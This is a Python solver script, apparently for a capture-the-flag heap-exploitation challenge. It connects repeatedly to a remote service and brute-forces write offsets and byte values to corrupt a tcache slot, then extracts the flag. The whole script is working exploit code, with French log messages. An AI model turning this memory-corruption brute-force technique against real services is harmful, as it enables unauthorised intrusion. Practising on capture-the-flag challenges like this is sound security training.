import sys, re, time, socket
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
host, port = open(r"./_z_146url.txt").read().split()
port = int(port)
LOG = open(r"./_z_146log.txt", "w", encoding="utf-8", buffering=1)


def log(*a):
    m = " ".join(str(x) for x in a)
    LOG.write(m + "\n")
    print(m, flush=True)


log("cible:", host, port)


def attempt(offset, value, wait=0.45):
    try:
        s = socket.create_connection((host, port), timeout=5)
        s.settimeout(wait)
    except Exception:
        return None
    try:
        buf = b""
        t0 = time.time()
        while b"Address: " not in buf and time.time() - t0 < wait:
            try:
                c = s.recv(4096)
                if not c:
                    break
                buf += c
            except socket.timeout:
                break
        s.sendall(str(offset).encode() + b"\n")
        time.sleep(0.03)
        s.sendall(bytes([value]))
        out = b""
        t0 = time.time()
        while time.time() - t0 < wait:
            try:
                c = s.recv(4096)
                if not c:
                    break
                out += c
            except socket.timeout:
                break
        return out.decode("latin-1", "replace")
    except Exception:
        return None
    finally:
        s.close()


log("=== phase 1 : slot tcache (valeur 0x00), offsets multiples de 8 ===")
hits = []
t0 = time.time()
n = 0
for off in range(-4000, -5601, -8):
    r = attempt(off, 0x00)
    n += 1
    if r is None:
        continue
    if "random string" not in r:
        hits.append(off)
        log("  HIT offset %d -> %r" % (off, r[:90].replace("\n", " ")))
        if len(hits) >= 4:
            break
    if n % 40 == 0:
        log("  ... %d essais (%.0fs)" % (n, time.time() - t0))
log("phase 1 terminee: %d candidats, %.0fs" % (len(hits), time.time() - t0))
if hits:
    off = hits[0]
    log("=== phase 2 : 16 valeurs a l'offset %d ===" % off)
    for v in range(0, 256, 16):
        r = attempt(off, v)
        if r is None:
            continue
        ok = "Congrats" in r or "academy{" in r
        log("  val=0x%02x -> %r %s" % (v, r[:90].replace("\n", " "), "OK" if ok else ""))
        if ok:
            m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", r)
            log("FLAG: %s" % (m.group(0) if m else "?"))
            break
log("FIN")
